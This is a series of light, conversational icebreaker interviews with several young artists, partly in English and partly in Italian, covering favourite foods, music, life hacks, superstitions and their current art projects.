No, penso di essere ancora molto confusa. Mi chiedo: voglio davvero essere un artista? E se voglio essere un artista, in quale direzione voglio andare? Ci chiediamo tutti questo no? Come adesso, sto facendo il mio PhD, ma seno cosa avrei fatto dopo la scuola? Se non stessi facendo il mio dottorato penso che cercherei di trovare un lavoro in modo da poter sopravvivere e poi cercherei di fare il mio lavoro artistico.

What do you do with your clothes after you’ve take them off?
Yea so, I haven’t grown up and I have a capital P – pile, often like in the middle of my room so that’s pretty real and that’ll last for a while and then I’ll kind of slowly work my way down the mountain. So, I’m a child.
Your favourite type of cheese?
Super boujee answer: Manchego. A no-brainer for me, my total guilty pleasure.
Do you find it easily?
They have it at Tesco..Tesco has all their normal cheeses then they have a selection of very small amounts of cheeses, so it’s kind of like treasured cheese gold.
You live in London, what makes you feel like a foreigner in London?
Two answers to that. One, when I actually moved here, I thought that as a place that’s English speaking it wouldn’t be much of a transition, but it was the supermarkets. This is just a thing in Europe I don’t think I was used to; the way the eggs are displayed and not in refrigerators. All those things just threw me off and not knowing what milk to pick. I guess the other thing is just realising how American I am in certain things. The way I leave something or a place where I was with friends I say ‘this has been so fun’ like an announcement to everyone. ‘Fun’ is the main word I use for some reason like everything is really ‘fun’ and ‘so fun’ and ‘funny’. And I really appreciated it last time I did that because everyone just kind of laughed at me and called me out for the limited vocabulary. But it’s also a level of enthusiasm people are suspicious of. Where they’re like ‘I had a lot of trouble believing you were being earnest’ and I definitely would have been utterly earnest and sincere in whatever I have been enthusiastic about but they just could not buy it that I was speaking with exclamation marks basically. Those are the two things.
What are you reading right now?
I’m reading reading ‘Psychopolitics’. It’s a really little book but I picked it up a while ago and then am finally now progressing through it now. I highly recommend it!
All my books just got packed up. I’m moving in a moment so I came home the other day to find all my books that my boyfriend had just like stuffed in boxes which is tragic because normally my entire life is just having them around me and that was very sad… but I’ll find it for you all and send you a picture.
Can you describe what you’re working on right now in 3 words?
language – technology – plastic
Facial or massage?
Oh. Facial would be the more responsible choice but massage is the more fun one and I could use one right now.
Tell us about the last time can you spent a reasonable amount of time in front of an artwork.
Like where I lingered…let me think. Sondra Perry at the Serpentine back in March. I thought having viewers row through hair gel while staring into the multiple screens of her video work and immersed in the audio was brilliant, and the work itself was like Turner but contemporary and urgent.
The last image you liked on Instagram [:
Do you know John Yuyi. She does all these temporary tattoos. This one is pretty low key. That’s what I liked.
Do you have a life hack you’d like to share?
I’m a big fan of portable chargers as an accessory. So, that would be my thing – extra battery packs hanging out of every pocket trying to keep my phone alive.
A question you might like to ask yourself?
I was so excited to talk to you guys but these questions make me notoriously nervous, this has been very pleasant but it’s like a whole interview of icebreakers. Ice breakers are my fear! But this has been relatively painless. I can think of list of icebreakers that have terrified me in the past. This moment of meeting people then just being absolutely frozen with icebreakers. So my question would be: what’s your greatest fear? And that might be one of them.

Cosa fai con i tuoi vestiti dopo esserteli tolti?
Non sono mica cresciuta tanto, ho una pila gigantesca in mezzo alla mia stanza che rimane abbastanza presente per un po’ di tempo, poi pian piano mi metto a lavorare per farla diminuire. Quindi sì, sono una bimba.
Il tuo formaggio preferito?
Risposta super borghese: Manchego. Non ci devo neanche pensare, è un guilty-pleasure per me.
Lo trovi facilmente?
Ce l’hanno a Tesco. Tesco ha la sua sezione di formaggi poi hanno un reparto con una selezione di formaggi in piccolissime quantità, quindi è tipo il tesoro dei formaggi.
Vivi a Londra, cosa ti fa sentire una straniera a Londra?
Due risposte a questa domanda. Uno, quando mi sono trasferita qui, un’altro posto dove si parla inglese, non pensavo che sarebbe stata una grande transizione ma l’ho notata soprattutto nei supermercati. E’ una cosa tipica Europea alla quale non sono abituata, per esempio, le uova sono disposte fuori e non nei frigoriferi. Tutte quelle cose me hanno fatto sentire scombussolata, anche il fatto di non sapere quale latte scegliere. C’è un’altra cosa che mi fa rendere conto di quanto sono Americana per certe cose. Quando me ne vado da un posto o dagli amici dico ‘e’ stato molto fun’ come un annuncio che sto per fare a tutti. ‘Fun’ e’ una parola che uso spesso. E ho apprezzato che l’ultima volta che l’ho fatto, i miei amici me l’hanno fatto notare e mi hanno preso in giro per il mio vocabolario molto limitato. Ma è anche un livello di entusiasmo abbastanza sospettoso per gli altri che pensano che io sia sincera e non possono capire la mia onesta e il mio modo di parlare con i punti esclamativi. Queste sono le due cose.
Cosa stai leggendo ora?
Sto leggendo ‘Psychopolitics’. E un libretto che ho raccolto tempo fa ma lo sto affrontando adesso. Lo consiglio fortemente!
Tutti i miei libri sono stati imballati. Tra poco mi trasferisco, quindi l’altro giorno sono tornata a casa e ho trovato il mio ragazzo che aveva imbottito tutti i miei libri in scatole, una situazione abbastanza tragica perché’ normalmente passo la mia vita intera con questi libri attorno. Ma questo ve lo trovo e vi mando una foto.
3 parole per descrivere quello su cui stai lavorando.
linguaggio – tecnologia – plastica
Massaggio o trattamento facciale?
Oh, il trattamento sarebbe la cosa più responsabile da fare ma il massaggio è più divertente e me lo farei volentieri adesso.
Raccontaci l’ultima volta in cui hai passato un bel po’ di tempo davanti a un lavoro d’arte.
Dove mi sono soffermata… lasciatemi pensare. Sondra Perry alla Serpentine Gallery a marzo. Ho pensato che invitare gli spettatori a remare nel gel per i capelli mentre guardano i molteplici schermi del suo lavoro ed essere immersi nell’audio fosse una cosa fantastica. Il lavoro in sé era come un Turner ma contemporaneo ed urgente.
L’ultima cosa a cui hai messo un like su instagram?
Conoscete John Yuyi? Fa questi tatuaggi temporanei. Questa era piuttosto tranquilla perciò mi e piaciuta.
Hai un life hack da condividere con noi?
Sono molto fan di caricatori portatili in quanto accessori. Quello sarebbe la mia mossa: avere batterie esterne che escono da ogni tasca per mantenere vivo il mio telefono.
Una domanda che vorresti fare a te stessa?
Ero molto contente di parlare con voi ma queste domande me rendono notoriamente nervosa, è stato tutto molto gradevole ma è come una interview piena di icebreakers (battute per rompere il ghiaccio). Posso pensare a una lista di icebreakers terrificanti del passato. Niente di peggio che incontrare delle persone e poi essere incastrati con solo icebreakers. Quindi la mia domanda sarebbe: Cos’e la tua paura più grande? E questa ne sarebbe una.

If you had one superpower what would it be?
Wow, tough question. It would probably be something to do with time – maybe having power over time… not actually going back in time but something like having more time in some specific situations, stretching it or having the ability to skip it forward in other situations.
If you were to go down in history for inventing something what would that be?
I have this thing for pioneering electronic music, like the first synthesizers and things like that. I think it’s a very romantic version of scientific research but completely focused on music and musical experimentation. I would like to be one of those first people to realise that electricity could produce sound, that you can translate an electronic signal to an audio signal and all the possibilities that come after that!
Is there a software you’re struggling to use?
Probably Adobe Illustrator… because I’ve recently started doing some illustrations and I’ve done most of them with Photoshop and I know that they’d come out way better with Illustrator. I feel like I’ve come to some point in which I managed to work out my own way of using Photoshop. Moving to a new software kind of scares me and also I would really like to actually know how to use some musical softwares the one I use right now is like the lamest software ever.
An exhibition you think would be good to take children to (nephews, cousins)?
Ok I think there are two different paths you can take from here. One is some sort of super huge institutional exhibitions for example I think about the Philippe Parreno exhibition curated by Andrea Lissoni at the Hangar Bicocca, it’s almost super entertaining and it could be entertaining for children as it has all those lights and the magical atmosphere. That could be an easy way into an artwork. Last time I was in London, I saw this show by Darren Bader at Sadie Coles. It was very lighthearted but it managed to address some super serious issues in the art world and how contemporary art really works right now. So I think starting from that could bring some very interesting approach to viewing contemporary art.
What’s the last song you played on your phone?
Let’s check Spotify…’In the Beginning’ by Weyes Blood. She’s an American songwriter. I think she’s really cool because she’s playing on all these typical folk singer aesthetics from the 60s and 70s and on it’s current revival without really being part of that revival (if it makes sense). I’ve got a quite strong connection with her and her music because I found out about her a little more than a year ago and when she came to play here in Milan there were like 10 people in the audience. I feel like one day she will be super big and I’ll be able to say ‘I was one of the 10 people who went to her show!’
If you could have been assisting any movie director in the making of a movie, who would it be and for what movie?
For historical reasons I’d say: assisting Stanley Kubrick on the set of The Shining. I once saw this documentary (I think by his daughter) that was on the set of The Shining, and it was super intense…apparently Shelley Duvall’s hair started falling out because she was so stressed. He adopted this technique where even if a scene was really good he’d keep filming to the 50th take to get the actors genuinely stressed out, not playing the role of a stressed out person but being really stressed. And even the hotel rooms, there were like 2 windows so it appeared like a corner room but when seen from the outside it clearly wasn’t a corner room. I think it would have been really interesting to take part in it, it’s one of the movies I like the most.
The most exciting thing in your schedule for this summer?
I’ve got a few concerts I’m really looking forward to, like yeah there’s this band called Godspeed You Black Emperor, then I’m going to see My Bloody Valentine so that will be exciting.
Yeah…I think that’s it for the summer because actually I have this thing in which my parents and my sister schedule their summer vacation like a lot earlier than I can even imagine and so I always end up being the one taking care of the dogs in August…but that’s pretty exciting as well, I’m kind of getting used to that being my real vacation like I have my house free for a month and I can watch all the TV series and movies and readings I missed during the year…yeah let’s see.
If you could right now speak to the ghost of an artist who would it be and what would you ask them?
Wow. If I could choose a writer it would be Frank Herbert. He’s the one who wrote the Dune Saga. It’s this super crazy and deep sci-fi saga set like 10,000 years in a parallel future where humanity has destroyed and banned any kind of artificial intelligence. I read the books back to back like 2 years ago and I feel like they completely changed my life and the way I see the future, humankind and life as a whole. I remember finishing them and feeling the urge of writing him a letter even though he died like more than 20 years ago I really felt like I had something to ask or tell him.
Do you have a life hack for us?
I am so glad you’re asking because I do and I really think it could make everybody’s life better! It’s actually my own copyrighted lifehack. I remember as a child I kind of developed super easy technique on how to wear your clothes when they are inside-out without having to put them the right way. So if you’re jumper is laying inside-out on the bed, you can just stick your head in the head hole and reverse it when you are wearing it. Super simple but just… genius!
A question you might like to ask yourself?
I’m really glad you asked how I wear my jumper haha, so I guess my question is: How do you wear your jumper? Or maybe: Do you fold your clothes after you wear them or do you just leave them there for the next time?

If you were to describe yourself in a dance move what would it be?
Ooh, that’s tricky, it’s hard. I don’t know the terminology, but I can do it now. A 70s hips move with a click. That’s my dance move/signature, it sums me up.
What was/is your favourite reality tv show on tv?
It’s obviously got to be Keeping Up with the Kardashians, it has to. I just think it’s so interesting. The way it’s changed over the seasons, it is fascinating. I’ve recently been watching Life of Kylie, which I also think is great, and obviously all of the offshoots: Kocktails with Khloe and Khloe and Kourtney in Miami. But the Keeping Up with the Kardashians franchise is definitely my number one favourite go to. I kind of went away from it and then came back to it, and I’m just just fully immersed in it even though it makes me quite sad to watch it because it’s just another world but it’s fascinating.
Let’s add an image of your Kardashian homes series
KIMS HAUS (painting by me 66x42cm)
When was the last time you changed your bedsheets?
Oh, I actually did that really recently It was about a week ago and I got some really nice bedding from TK Maxx. Your bedroom has to be a haven, you have to love being in there.
If you were to eliminate one colour from your palette forever what would that colour be?
Purple, real dislike. All purple. A really bright purple is just kind of gross, like Barney purple. It’s just garrish and nasty. It’s awful when you’re mixing up paint and you end up with purple or when it gets on the canvas and you’re like what is that… Never in clothing, not on a palette, never, no flowers either.
French fries or doughnuts?
French Fries everytime, I’m more of a savory person. McDonald’s, great ones.
One single that you are you like that came out in the last year?
Well, recently, in line with the colour theme, one song I’ve been listening to on repeat is PYNK by Janelle Monáe. It’s such a lovely song. The whole album, Dirty Computer, is amazing.
Something you are looking forward to?
Lots of things. Summer break! This year has been quite intense, it will be nice to take some time to relax and not watch reality tv. Take a few weeks over summer to go out to places, go to the seaside and be a tourist. Enforce time to not work and do things I would enjoy as I have a tendency to box myself in.
If you could choose anyone to sit for you for a portrait?
I’d have a group, or a band. Maybe a family! Omg, as long as they were there in the flesh, I would paint the Kardashian family portrait and the extended family. Even in purple, if they wanted. If it would be of one person I would choose Kris, as she is the matriarch.
Life hack?
Right, my life hack is Citymapper! I literally couldn’t negotiate London without it, as someone who’s come from outside the city. A friend of mine told me to get the app when I got here last year and recommend it to everyone. I use it daily and it’s a total godsend.
Question?
If you had one superpower what would it be?
In Xmen, there’s this guy who can split himself into multiple versions of himself. I think he’s called Madrox! It would be so good to have multiple clones so I could get more stuff done, so while I’m in the studio there could be another me doing the washing, or shopping, and going out and about to galleries. It would be amazing, it’d be super productive!

What would you like for dinner?
Uhmm…well..I just downloaded MyFitnessPal for the 20th time. So i’m gonna have to eat what fits into my calorie count and currently I only have 450 calories left. I eat when i’m sad.
How tall are you?
5ft7…
In cm? … google says 170cm. That’s model material right there!
Haha, its been two years since I went to the gym but I need to start back, genuinely for my performance work. I like pushing myself to limits. My ideal height would be 2 inches taller, that’s like 175 cm.
What was the last thing you created?
My mum gave me a big bag of her old hair and weaves. I‘ve been playing around with that and some conch shells from Barbados where my family are from. So right now they kind of look like little animals. I found animals healing but was only allowed/could afford goldfish and hamsters. I’ve been playing around with that: stuffing the hair in the shells. And I’ve made some engravings on steel plates. It’s all centred around my parents and my core friendship group.
Can you tell us a joke?
The only one I can remember is:
Why didn’t the skeleton go to the dance? -because he had no body to go with. It’s awful isn’t it? I found it in the penguin packets, the chocolate bars.
If you could steal something without getting caught, what would it be?
Uhmmm… money. I’d steal money and I’d make more art from all the money I’ve stolen.
What do you like to wear when you go to work/your studio?
To my studio I end up wearing like leggings and a hoodie, or a skirt and a hoodie. I’m always in skirts. Being as comfortable as possible and also not wearing too nice clothes because they just end up getting messy anyway. This studio is warm, thank god, but in other studios I end up being wrapped up; anything with thermal lining.
Do you do a salary work outside of your art practice?
Of course I do, and for that I have a stricter uniform: it’s black and chic and maybe a little bit sexy.
Are we allowed to know what this work is?
I work in an erotic boutique.
Do you like it?
Yea, the power dynamic is quite different to the past retail jobs or waitressing I’ve done throughout the years where people can talk to you like shit. Whereas in this place people tell you a lot of secrets, they are in a much more vulnerable position at times so they’re nicer to you. How often do you get to know what happens when people get home, in the bedroom etc. The ‘normal’ ones are never ‘normal’.
An artist or mentor you would chose as a godfather/godmother?
‘FORMERLY CALLED’, a collective of Black and brown artists that i’m currently in residence with at Wysing. They’re amazing. All the collective would be my chosen GODPEOPLE.
What would you like to have written on your gravestone?
Wow these questions are quite intense haha…it’s good though because I deal a lot with death in my work. I think I would just like to have it plain and have ‘G’. No age, no nothing. I think I’d just have my nickname ‘G’ and that’s done. Also I think I want to be cremated, graveyards are a tight squeeze you know.
If you could perform with one person for the rest of your art career who would it be?
I think performing with one person for the rest of my career is weird, we’d end up both be annoyed at each other. I think that’s a really hard thing to do. And if it’s a peer or someone I admire, I think in the end it would be stifling. So I guess it’d have to be my mum, it would have to be mamma-G. SHe’s stuck with me, she made me hehe.
Can you share a life hack with us?
My life hack is to have one day off a week. I think it’s very easy when we’re writing applications and stuff to think ‘oh I’ll just do that on my day off, lying in bed’, but that’s still work, that’s still labour. So one day where I do nothing or whatever it is that I want to do that has nothing to do with art (even reading about art). So yes, one day off a week is really beneficial for my mental health. I’ve done that before and ended up not feeling very good at all. I have to enforce it, I have it on my contract, I tell people, I even tell my mum she might not be able to get a hold of me on Sundays.
A question you might want to ask yourself?
If you were to describe yourself in a dance move what would it be?
For me….grinding, body rolls, twerking, wining up etc etc

When was the last time you went to an amusement park?
The last time was at Winter Wonderland, in Hyde Park. I went with friends but I didn’t do any rides. I’m afraid of heights, so I don’t enjoy those kinds of rollercoasters.
What did you have for breakfast today?
Um… bread with Nutella. That’s kind of weird.
For us as Italians it’s normal…for breakfast with coffee, just perfect.
Yea. I don’t usually have breakfast with bread, but really had no time for cooking this morning.
The name of your first pet?
I had a dog when I was really young, and his name was Bao. I don’t really know what the meaning of the name is. I remember, he was an Alsatian (German Shepherd). My family were with him for many years. After Pao, we had to move into a city and didn’t have much space for a pet anymore. I do miss Pao sometimes!
The last video/film/photo that made you cry?
I have to think about it.. I’m sure there’s one, because I’m a very sensitive guy. Oh! It was a movie called the Pursuit of Happiness. I just watched it again for the 3rd time and still cried…every time. It is such an emotional film. 
The most played song on your phone?
I’m not sure about my phone but I actually always listen to music on Youtube, and there’s a song that I played, something like 15 times last night. It’s a song called Never In My Wildest Dreams, by the guy of the Black Keys, the singer [Dan Auerbach]. I just found out that he’s doing a single album now, I love it, it’s very good!
Could you give us a photograph of your last holiday?
A photograph, on the phone yea?
The last holiday…when was it? It was like three days ago, when we got sunshine in London. I had so many things to do, but I decided to not care about it. I went to the park with friends and we sat there, sitting in the sun, talking about the world and life. After, we went to play basketball but I haven’t exercised in many years so I was really tired…But it was awesome to get some sun here, Everything changes!
What is your phone lock photo or background?
It’s a black plain background. Hahaha, sorry guys, nothing so exciting.
Do you think you are generally lucky as a person?
I am. A very lucky man. In many terms… I always feel like I’m blessed to be here, I’m blessed to be doing what I’m doing and to be the person that I am. So that’s a wonderful feeling!
So you believe in luck?
Well, I’m a Christian, so I believe that everything is somehow all planned to be.
Do you have a life hack for us?
Ok: when you’re stressed, just go to sleep. Not necessarily sleep but taking a nap, closing! your eyes for a second and try not to think about anything.!
A question you might like to ask yourself?
It’s very simple but very hard at the same time. Let me think…
What would you like to have for dinner?
I really wanna have some Thai food now.
Any place you’d recommend in London?
There are some, the one called Lao Cafe is really nice, very authentic, in other words: SPICY!!

What animal are you right now?
Right now, I feel like an animal that is about to go into hibernation, that goes in reverse now that spring is coming. I love spring but I feel like going for a rest. I don’t know if animals can hibernate in reverse.
I don’t think so but there is one hemisphere that is entering winter
Yes, maybe I got the wrong time zone, I should live on the over side of the world, and somewhere warm, maybe. Maybe it’s a special animal that doesn’t exist on this planet yet.
The last song you listened to on youtube?
I watched an excerpt of a classical music opera, by this singer called Juan Diego Florez who sing an aria from Orfeo ed Euridice. This is because I recently saw him at La Scala. I thought he was a great singer so I tried to get in last minute and I managed! I really liked it so when I came home I looked for something he had sung live.
Coffee or tea?
Americano… which is a coffee that is a little like tea because it’s so watery.
The last place you visited on your last holiday?
It was this weekend, I went in Romagna… so, except for ending up at a nude beach with nudists, (10 degree weather), I went to a place with a lagoon. It felt like being in Star Wars, when Luke goes to visit Yoda at his house where trees grow from the water. I won’t tell you how it’s called, I’ll leave it as a mystery. Let’s call it Yoda’s House in Romagna.
If you were a witch what would your favourite spell/potion be?
Let me think… a potion to fly?! I don’t have to give you a recipe right?
Can you give us 3 images/stills of stuff that you’re working on?
Your favourite fruit?
Mango!… but mangos like the ones I ate in Israel, because they’re in another league. I’d really eat a mango right now. But no it’s not the right season.
If you could save one of your art works which one would it be?
The video with my grandma making mountains. It definitely has some sentimental value.
Do you have a life hack for us?
Yes… oh no I can’t tell you this one it’s too stupid haha: wearing double socks in winter!
Or actually, I would advise to have a lot of small plants. They make me happy, everyone should have a lot of plants.
One would have to be able to take care of them though.
Then you have to have succulents. So you have something you can take care of, love without thinking only about yourself.
A question you might like to ask yourself?
Well, when I was in Romagna I saw the Ferris wheel of Mirabilandia, this amusement park. So I wondered when was the last time I had been to an amusement park. It’s like trying to track down prehistoric information…well actually now I remember: two years ago I was in Pescara with friends and one night we passed by an amusement park so we just went in and decided to spend all of our time on the caterpillar roller coaster!

Do you love penguins?
I’m a bit… It immediately reminds me of my Greek teacher in high school. I started laughing because he really looked like a penguin and he walked like a penguin. So I said to my friend: Oh – mr. Bonn was his name – he really looks like a penguin, and he heard me so from that moment, my grades they really went down.
What do you wish you had learnt as a child?
Electric guitar, I’m still trying to learn but I realized I will never get close to Kurt Cobain. It was also to seduce Kurt Cobain but I didn’t realize he died, so when I found out I was really sad. I’m still trying to learn but I really realize it’s too late.
A drink you are craving right now?
I think it’s a White Russian, but maybe… yes that’s not really true, because you were starting to talk about what you would have liked to learn as a child, a language, so that made me think of Russian and the White Russian drink. Now, I would like coffee, always craving coffee.
If you could design the theme of a video game what would it be?
Marshmallowland… Marshmallow World, where you walk around, yourself as a marshmallow in a marshmallow world. Baby colored: baby blue… baby pink, maybe orange… Nice and soft, fluffy and sticky.
Something that you used have recently started enjoying?
Let me see… It’s very intimate so I won’t tell you about that [haha]… Maybe peanut butter. I didn’t like it, but now I’m really addicted to it.
What made the change?
When I moved away from Holland, where we have really good peanut butter, called Calve Pindakaas, it’s very good, please look it up. I suddenly started to miss it. So now I’ve been importing and even smuggling it. After my last visit to Amsterdam I tried to smuggle peanut butter and Sambal Badjak (of course not Dutch but Indonesian) back to London but at the airport they were like ‘Sorry Miss, this is way more than 100ml’…. And the measurements were in grams not ml, it’s just stupid, I’m not going to kill anybody with peanut butter. So they took my food but didn’t take my razor blades!
Can you screenshot your desktop for us?
Are you superstitious?
I’m very superstitious actually. I like to believe I’m not, but I really am.
What’s your biggest superstition?
The number 8. I see it everywhere. The loops. I have this thing with palindromes and symmetry, like my name ‘Anna’ when you flip it it’s still ‘Anna’. That loop, I see it everywhere like it’s following me. I once had a drawing contest, as a child, and I won but I won only because I had this 8, I drew the 8 on the back of the drawing. And there is also this astrology newsletter that I really believe. A friend recommended this to me, it’s a guy from New York called Rob Brezsny.
We love Rob Brezsny!
Oh my god! Seriously guys, last week he told me ‘you will have 3 successes’. It started off as a horrible week… I was really sad because I used to love him and believe in him and suddenly I didn’t believe him anymore. But then I got 2 emails and a phone call with good news! I was like ‘Oh Rob!’. A friend recommended him, so no credits to me!

The last art show you went to where you felt really uncomfortable?
Maybe it was the last time I was doing a performance. I did it a few times but there was a moment when only 2 people were watching. It makes you really self aware.. I’m really happy that I’m not a painting, you see how people look (or how little they look) at an artwork. That was at the WIP show at the RCA (Royal College of Art).
Life hack?
Yes, I would say, so I live in Brixton and to get to school in Battersea it takes 1hr 15minutes to walk. So during the walk use that time to plan the day and make phone calls with my friends back in Amsterdam. Walking around, you save money and you use that time to make phone calls! And you exercise too!
A question you would like to ask yourself?
What animal would you be if you were an animal right now?(because you know, it changes everyday). So looking at myself right now on Skype, I would say I look a bit like a frog with a big mouth….but my eyes are really like small, and frogs have big eyes. Maybe also a donkey because I have been think about them a lot recently. So maybe I’d be a donkey with a frog face.
Can you tell us about the donkeys?
So I’m working on a performance which will be sort of a workshop on how to become a donkey.

Who do you think you are?
I don’t know, that’s such a hard question. Oh god, I.. who do I think I am. An artist who wants to… no forget that. I think I’m an artist who likes penguins.
What is your favourite emoji?
I don’t really use emojis that much. But when I use emojis i always put a smiley face with three smiles for no reason… because I hate that the emoji comes up without wanting it to be emoji so I always put three smiles :)))
Have you ever witnessed something paranormal?
I have actually. When I was younger, I would always leave my keys in the door, but then my mom would always tell me off. One time I left my keys in the door and there was someone outside and they ran away and I heard stuff downstairs but no one had come in the house…And there might have been an angel like scaring away people, which I don’t know… I don’t know if it was real or not. I think there was a good demon in my house scaring away people who tried to steal my keys.
Cheese or chocolate?
Chocolate, I do like cheese as well but it’s chocolate. Although I’ve had to stop eating chocolate because my teeth are starting to hurt so I might have to switch to cheese, I don’t know.
Favourite chocolate?
I think… it’s a hard question. Salted caramel, anything with salted caramel.
Something that is currently stressing you out or frequently on your mind?
I always get stressed out that I’m not being productive. I’m always thinking I haven’t had a productive day even if I’ve done lots of stuff, that always stresses me out. Even when I’m being productive, I’m worried I’m not being as productive as I can be.
If a pop singer could feature in one of your works, who would that be?
Mhmm, I’ve got my computer, I’ll look at my Spotify list. I think, the Beastie Boys, just because I like that Intergalactic song, that’d be a good song.
If you could chose someone to design your house?
Hmm, maybe some crazy themed film…like Stanley Kubrick, that’d be cool.
Not like the shining right?!
I was thinking more like space odyssey I think, maybe not. I’ll just let him do what he wants.
Your favourite theme park/zoo?
Well, I love penguins, when I was younger my favourite zoo was called Birdland and it was because you got to stroke the penguins. So was my favourite because I got to touch a penguin.
Tell us how much of your work deals with penguins (in percentage).
Well I’ve always liked penguins, so if I don’t know what to do I’ll always associate it with penguins. So probably like 50% of my work is with about penguins.
What are you working on?
I’m writing a short film about a dodo that works in a computer shop. That’s all I’m going to say right now because I’m still writing it.
We’re big fans of dodos here!
I’m still writing it. You know when you’re at that writing stage where you still haven’t formulated everything… I’m going to make a animated story that’s gonna be set in the future but it’s going to be kind of ridiculous with time and so these dodos are going to have giant gloves and they’re going to be fixing old computers. I don’t want to give too much of it away!
Life hack for us?
Yea I do! 2 days ago, no, last week, my grandma got me a diary. Very simple, the last week of my life has been so much more organised because I write everything. So, ‘get a diary! When someone is like ‘are you free next week?’ I get out my diary and feel so much more productive (even though I’m not being that productive) and look it up…It’s a socialcano hehe
Question you would like to ask yourself?
Is this going to be asked again? Yes great:
Do you love penguins?
When did you find out you love penguins?
It all happened when I was 1, my nan bought me a penguin toothbrush holder and I liked it more than any of the other toys that I had. So it was a penguin toothbrush holder and it was Pingu but I called it Kiko. And because I loved it so much, everyone kept buying me penguins. Then Pingu came on TV and I was like ‘yay, I can watch Pingu’…There’s no way out!

How old do you think you are?
I think I am 27 because I know I am 27. No, yea I know that I’m 27, I’m just gonna answer that. That’s a really rubbish answer, but there you go, my own age.
The ultimate travel food?
I think this is interesting because I once applied for a job as someone who moves trolleys around in a supermarket car park. During the interview they got everyone together, it was maybe 15 people, and asked these similar questions of like ‘What’s your favourite food?’ or ‘If you were to travel somewhere what would you eat?’…and I really crumbled in that situation. I think there’s a way in which you see yourself as mediocre or you become mediocre when someone asks you the kinds of questions that have you think on your feet. In order to get out of that kind of situation you think of the first thing you can think of so you can escape that question.
And so my favourite travel food…I mean, I like fruit…and that makes me seem like a generic mediocre person but I like to eat fruit when I’m traveling.
Yea, so I’m gonna say: A satsuma.
Your dream job when you were a child?
I wanted to be an actor but I don’t think I knew it was a job. It’s just what I wanted to be. I think you learn to answer that question at a young age. Don’t you? And I think that if you say something funny you realise very quickly that you don’t want to say it again because it brings attention to you…but maybe I enjoyed saying I wanted to be an actor because it brought attention to me. Then when I hit puberty I stopped wanting so much attention, so I kind of avoided the question.
Your favourite gif?
It’s david beckham and his sons getting covered in gold gunge. And this one with the field.
The most memorable thing you did for valentines day?
It’s valentines day tomorrow right? My partner is not mad on valentines day…because she’s much more, uhm, intelligent than other people. I think that I probably had some tragic cinema dates with people when I was younger. I actually went on a valentines date with someone and my mum to see a film, so maybe that one!
Do you remember how old you were?
I was 25 (haha). I would have been about like 9. I’ve always been a really romantic person especially in my youth. I was very emotional and sensitive and I used to fall in love almost every day.
If you could be gifted with a skill, what would that be?
I get quite sad. I think that if I could control that, that would be a hell of a skill. I think there’s a way in which you can take certain things that stop your brain from making you feel sad… but if there was a way in which you couldn’t feel sad it would probably be a nightmare, you’d be like someone with no inhibitions and you’d be awful to be around. The concept of not being sad is pretty blissful though and I’d probably take that.
The most embarrassing object you used for an artwork?
Probably my own body because, honestly, I’m quite obsessed with this idea of embarrassing myself so much that I’m not embarrassed. That question is the answer of my practice in a way…I’m constantly embarrassed. I’m embarrassed to talk about it, you know, especially when people ask me what I’m doing out of the institution or comfort of an art school or art bubble or whatever it is. I think that being alive as someone who identifies as an artist is pretty embarrassing and pretty selfish and it’s a daily struggle.
The best profile to follow on instagram?
Oh come on guys! I actually kind of loathe instagram but I’m very much aware of what it means in my life. I used to not really play computer games when I was younger, I would with other people but I would never do it on my own because I found it unfulfilling, you never really get anywhere, it’s like that concept of the donkey and the carrot. As soon as you turn it off it’s gone. I feel like with instagram I never have any closure and I often behave in like a really erratic way and then regret it. I don’t think anyone should follow anyone on instagram, so I don’t think you should follow any profile on instagram. I think that in 100 years instagram will have come and gone…but I’m on it if you want to look at it, and I apologise for what I put on there.
Yea, we use it way too much… One of us has 4 accounts…
There used to be a thing called bebo when I was growing up. I don’t know if you guys ever encountered it, it was a bit like myspace but you could give each other ‘loves’. So I used to go on my little brother’s account and then give myself a love and then I’d delete it from his so he never knew. I had loads of loves so it made me seem really popular. So I guess that’s the kind of person that I am.
Do you have a life hack for us?
Yea, I think you should not aim to hack your life.
That’s a fuckin’ facetious answer haha. You know what, recently I was on a plane and I was listening to some happy hardcore music as the plane was taking off. That was euphoric. It felt like my heart was going to explode so you should do that. I’ll send you a link.
What is Happy Hardcore?
Happy hardcore and also hardstyle, it’s kind of really intense techno music and has a very fast beat-per-minute. It’s very intense and overbearing but to me it sounds like the music of the future. I think that one day people won’t be interested in melody but they’ll be interested in syncopation and will only want to experience music texturally.
A question you might like to ask yourself?
I feel like I’ve spoken quite a lot so we’ve covered a few things but if I were to ask myself a question I would ask myself: Who are you?
Do you want me to answer it as well?
Yea…
I’m Luca George.

Are you afraid of the dentist?
Yes I am! Super afraid… 3 weeks ago when I was in Korea I got my wisdom teeth taken out. They were lying down so to take them out you need to like smash them into 4 piece before taking them out. I hate going to the dentist and dentists really hate me also because I go crazy. I ask so many questions because you can’t really see what’s happening and what they’re using. Like, ‘what are you going to use to smash my wisdom teeth’ and this nurse made a joke: ‘Oh with a hammer’, I was like ‘Oh no!’ but then she said it was a joke… They can see what I can’t see.
The last screenshot that you took?
I’m really interested in screenshots because you’re making a digital object on your phone that just remains as a picture in your photo album. I have plenty of screenshots!
Your favourite superhero?
Maybe Spiderman? I need to think about it…Actually, I really like the ‘Sadness’ in the Inside Out animation. Maybe it is because people said I resemble her (haha). I kind of liked her laziness and lethargic state. And actually she is the unsuspected hero of the story. This is my Sadness doll.
The best present you ever got?
I think, it’s the best and the worse: On my birthday there is a friend who gives me these presents as a joke to make me upset or something. On the last birthday she gave me a children’s book about this birthday girl who invites everyone to her birthday and then no one comes so she gets really sad. This present was actually the best one, it gave me different feelings…it’s one of those presents that you can’t use. Something that is wearable or something that I can use doesn’t remain a ‘present’ for me, it becomes mine the moment I start using it.
What’s last movie that made you cry?
I saw this movie on the airplane when I was coming back from Korea. It made me cry, I had tears in my eye…It was about this woman painter who struggles with arthritis and she met this guy who was really grumpy and really bad to her but then they fall in love. The film is called Maudie.
What’s your favourite form of public transportation?
I hate the tube. It’s not because it’s dirty or whatever, it’s just because I don’t like the fact that I need to go down and come back up again. Maybe the bus. In korea I always took the bus to go to school, like for an hour. When I’m on the bus it’s the place where I think the most, I go somewhere else in my mind.
A really awesome material you discovered(and started using) in the last year?
Art Material? I liked and started using Silicon, casting it or covering the surface of things. It has really different kinds of textures, when you make thin layers it shines, if you let it dry in the air it stays shiny and if you cast it in something it gets more matt. I also like this milliput thing, it’s like a clay but it gets super solid in like 10 hours. You can make anything. You need to mix the two pieces together and make stuff. You can also carve a little bit later. It looks like plastic after, it doesn’t really look like clay.
If we could gift you with magical powers what would you choose?
